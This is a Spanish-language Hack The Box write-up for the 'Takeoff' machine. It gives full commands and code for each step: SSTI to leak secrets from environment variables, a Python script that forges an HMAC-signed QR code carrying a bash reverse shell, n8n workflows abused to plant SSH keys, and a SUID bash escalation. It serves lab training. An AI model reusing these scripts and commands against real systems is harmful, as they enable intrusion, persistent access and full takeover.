---
title: Takeoff
description: Takeoff es una máquina Linux "Dificil" que presenta una cadena de vulnerabilidades encadenadas. El acceso inicial se consigue explotando una vulnerabilidad SSTI en el sistema de tickets, lo que permite filtrar una clave HMAC y una API key de n8n. Utilizando la clave HMAC, se forja un código QR malicioso para obtener ejecución remota de comandos"RCE" como www-data. Posteriormente, abusando de la API interna de n8n, se obtiene ejecución de comandos como root en un contenedor, permitiendo el movimiento lateral al usuario kpark en el host. para al final abusar de una configuración insegura en un volumen compartido nos permite escalar privilegios a root.
date: 2026-10-31
toc: true
pin: false
image: assets/img/htb-writeup-takeoff/logo.png
categories:
  - Hack The Box
  - Machines
  - Linux
  - Dificil
tags:
  - SSTI
  - HMAC
  - gob
  - n8n
  - RCE
  - api_key_leak
  - SUID
  - escape_conteiner
  - PrivEsc
---

## Recon

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.xx.xx -oG allports

nmap -p22,80 -Pn -sCV 10.129.21.177 -oN targeted
```

Resultados:
- 22/tcp (SSH): OpenSSH 10.0p2 Debian
- 80/tcp (HTTP): nginx (HTB Airways Booking)


añadir el dominio al archivo hosts:
```bash
echo "10.129.21.177 takeoff.htb" | sudo tee -a /etc/hosts
```


La aplicación web es un sistema de reservas de vuelos desarrollado en Go (Echo/HTMX). Permite el registro de usuarios, reserva de vuelos y la generación de tickets con códigos QR.

## Foothold

#### SSTI

Al crear un ticket, se habilita una sección de notas. Al inyectar la expresión `{% raw %}{{7*7}}{% endraw %}` en las notas y descargar el PDF del ticket, el motor de plantillas renderiza un `49`. Esto confirma una vulnerabilidad de Server-Side Template Injection (SSTI) en el motor `text/template` de Go.


### filtrado de variables de Entorno
Se utiliza el método `File` expuesto en el entorno de la plantilla para leer archivos del sistema. Inyectando el siguiente payload:

```
{% raw %}{{ .File "/proc/self/environ" }}{% endraw %}
```


Al descargar el PDF, se obtienen las variables de entorno del proceso, destacando:

- `TICKET_VALIDATION_TOKEN=JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR` 

- `N8N_API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`


### Análisis del Código QR
El código QR del ticket contiene un blob serializado en formato `gob` de Go. Al decodificarlo, se obtiene la siguiente estructura JSON:

```json
{"PNR":"B5H9ZM","Token":"9554a3ce4872b662b5cb758632d4b8e5","Seat":"1A","Passenger":"ajente007","NotifyCmd":"check-in-notify --pnr B5H9ZM --email a@a.com"}
```

El servidor utiliza la directiva `NotifyCmd` para ejecutar acciones cuando se escanea el QR. Los últimos 32 bytes del blob corresponden a una firma HMAC-SHA256 calculada con el `TICKET_VALIDATION_TOKEN`.

### Forja del Payload y RCE

un script en Python para modificar el comando `NotifyCmd` por una reverse shell, manteniendo la misma longitud del JSON original y recalculando la firma HMAC con la clave filtrada.

```python
import base64
import hmac
import hashlib
import re

BASE64_QR = "ThAAHSpnb2IuVmVyaWZ5VGlja2V0QXV0aGVudGljaXR5fwMBARhWZXJpZnlUaWNrZXRBdXRoZW50aWNpdHkB/4AAAQEBBERhdGEBCgAAAP+i/4D/ngH/mnsiUE5SIjoiQjVIOVpNIiwiVG9rZW4iOiI5NTU0YTNjZTQ4NzJiNjYyYjVjYjc1ODYzMmQ0YjhlNSIsIlNlYXQiOiIxQSIsIlBhc3NlbmdlciI6ImFqZW50ZTAwNyIsIk5vdGlmeUNtZCI6ImNoZWNrLWluLW5vdGlmeSAtLXBuciBCNUg5Wk0gLS1lbWFpbCBhQGEuY29tIn0Aiqpkp0cqhXebFYKw+V+ypJ4c+eZge0zO7QvzdZBT3sM="
HMAC_KEY = b"JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR"

LHOST = "10.10.xx.xx" # <-- ip de vpn de htb 
LPORT = "5001" # <-- puerto escucha

def forge_payload(b64_qr, key, lhost, lport):
    raw = base64.b64decode(b64_qr)
    jm = re.search(rb'\{"PNR".*?\}', raw)
    original_json = jm.group(0)
    jlen = len(original_json)
    
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    
    pnr = re.search(rb'"PNR":"(.*?)"', original_json).group(1).decode()
    token = re.search(rb'"Token":"(.*?)"', original_json).group(1).decode()
    seat = re.search(rb'"Seat":"(.*?)"', original_json).group(1).decode()
    passenger = re.search(rb'"Passenger":"(.*?)"', original_json).group(1).decode()
    
    prefix = f'{% raw %}{{{% endraw %}"PNR":"{pnr}","Token":"{token}","Seat":"{seat}","Passenger":"{passenger}","NotifyCmd":"'.encode()
    suffix = b'"}'
    
    room = jlen - len(prefix) - len(suffix)
    padded_cmd = cmd.encode() + b" " * (room - len(cmd.encode()))
    new_json = prefix + padded_cmd + suffix
    
    new_body = raw[:jm.start()] + new_json + raw[jm.end():]
    sig = hmac.new(key, new_body[:-32], hashlib.sha256).digest()
    
    return base64.b64encode(new_body[:-32] + sig).decode()

new_qr = forge_payload(BASE64_QR, HMAC_KEY, LHOST, LPORT)
with open("malicious_qr.txt", "w") as f:
    f.write(new_qr)
```


al ejecutar el script, eh inicia un listener; se envía el payload al endpoint de la API.

```bash
nc -lvnp 5001

curl -X POST http://takeoff.htb/api/check-in --data-urlencode "qr_data=$(cat malicious_qr.txt | tr -d '\r\n')" -d "gate=WEB"
```


obtienemos acceso como `www-data` y se estabiliza la shell con bash.

```bash

script /dev/null -c bash

ctrl + z

stty raw -echo; fg

reset xterm

export TERM=xterm
export SHELL=bash

```


## Lateral move "www-data --> kpark"

#### enumeración
dentro identificamos una instancia del servicio n8n escuchando en el puerto local 5678. Utilizando la `N8N_API_KEY` filtrada previamente, se obtiene acceso a la API.

```bash

ps aux | grep -i n8n

ss -tlnp | grep 5678

```

### workflow malicioso
via la API para crear y ejecutar un workflow malisioso que consiste en un Webhook y un nodo de ejecución de comandos.

```bash

curl -s -X POST http://127.0.0.1:5678/api/v1/workflows \
  -H "X-N8N-API-KEY: <N8N_API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pwn",
    "nodes": [
      {"parameters": {"path": "pwn", "responseMode": "lastNode", "options": {}}, "name": "Webhook", "type": "n8n-nodes-base.webhook", "typeVersion": 1, "position": [400, 300], "webhookId": "pwn"},
      {"parameters": {"command": "id"}, "name": "Execute Command", "type": "n8n-nodes-base.executeCommand", "typeVersion": 1, "position": [600, 300]}
    ],
    "connections": {"Webhook": {"main": [[{"node": "Execute Command", "type": "main", "index": 0}]]}},
    "settings": {}
  }'
  
```

se activa el workflow y se dispara para verificar la inyeccion.

```bash

curl -s -X POST http://127.0.0.1:5678/api/v1/workflows/<WFID>/activate -H "X-N8N-API-KEY: <N8N_API_KEY>"

curl -s http://127.0.0.1:5678/webhook/pwn

```

El resultado confirma la ejecución como root dentro del contenedor `uid=0(root)`

---


##  inyection key.pub ssh

El directorio `/root` del contenedor n8n está montado sobre el directorio `/home/kpark` la maquina. En lugar de crear un workflow y luego actualizarlo, inyectamos el comando de escritura de la clave SSH directamente en la petición `POST` que crea el workflow.


se generan un par de claves y la codificamos en Base64 para evitar problemas con espacios o saltos de línea en el JSON:

```bash
ssh-keygen -t rsa -b 2048 -f kpark_key -N ""

cat kpark_key.pub | base64 -w 0
```
`se copiam el string resultante`.`


Desde la shell de `www-data`, se crea el workflow inyectando el comando malicioso en el nodo `Execute Command`. Utilizando el string de Base64 generado en el paso anterior sustituir: `<BASE64_PUBKEY>` "


```bash

curl -s -X POST http://127.0.0.1:5678/api/v1/workflows \
  -H "X-N8N-API-KEY: <N8N_API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pwn",
    "nodes": [
      {"parameters": {"path": "pwn", "responseMode": "lastNode", "options": {}}, "name": "Webhook", "type": "n8n-nodes-base.webhook", "typeVersion": 1, "position": [400, 300], "webhookId": "pwn"},
      {"parameters": {"command": "mkdir -p /root/.ssh && echo <BASE64_PUBKEY> | base64 -d >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys && chown -R 1001:1001 /root/.ssh"}, "name": "Execute Command", "type": "n8n-nodes-base.executeCommand", "typeVersion": 1, "position": [600, 300]}
    ],
    "connections": {"Webhook": {"main": [[{"node": "Execute Command", "type": "main", "index": 0}]]}},
    "settings": {}
  }'

```


Obtenemos el `id` del workflow en la respuesta JSON y lo activamos:

```bash

curl -s -X POST http://127.0.0.1:5678/api/v1/workflows/<WFID>/activate \
  -H "X-N8N-API-KEY: <N8N_API_KEY>"

```


se dispara el Webhook para ejecutar el comando en el contenedor

```bash
curl -s http://127.0.0.1:5678/webhook/pwn
```
*(Respuesta esperada: `{"exitCode":0, "stderr":"", "stdout":""}`).*


Desde nuestra máquina local es, conectarse a la maquina como `kpark` usando la clave privada:

```bash
ssh -i kpark_key kpark@10.129.21.177
```

---

## PrivEsc

El volumen compartido `/home/kpark` no cuenta con la restricción `nosuid`. Esto permite crear un binario SUID en el contenedor y ejecutarlo con privilegios elevados.

Desde la sesión de `kpark`, se copia el binario de bash al directorio compartido.
```bash
cp /bin/bash /home/kpark/htb
```


y en la sesión de `www-data`, se actualiza el workflow de n8n para asignar privilegios de root y el bit SUID al binario.
```bash
curl -s -X PUT http://127.0.0.1:5678/api/v1/workflows/<WFID> \
  -H "X-N8N-API-KEY: <N8N_API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pwn",
    "nodes": [
      {"parameters": {"path": "pwn", "responseMode": "lastNode", "options": {}}, "name": "Webhook", "type": "n8n-nodes-base.webhook", "typeVersion": 1, "position": [400, 300], "webhookId": "pwn"},
      {"parameters": {"command": "chown root:root /root/htb && chmod 4755 /root/htb"}, "name": "Execute Command", "type": "n8n-nodes-base.executeCommand", "typeVersion": 1, "position": [600, 300]}
    ],
    "connections": {"Webhook": {"main": [[{"node": "Execute Command", "type": "main", "index": 0}]]}},
    "settings": {}
  }'
```


al dispararse el Webhook, desde la sesión de `kpark`, se ejecuta el binario SUID para obtener una shell como root.
```bash

/home/kpark/htb -p
htb-5.2# whoami
root

```
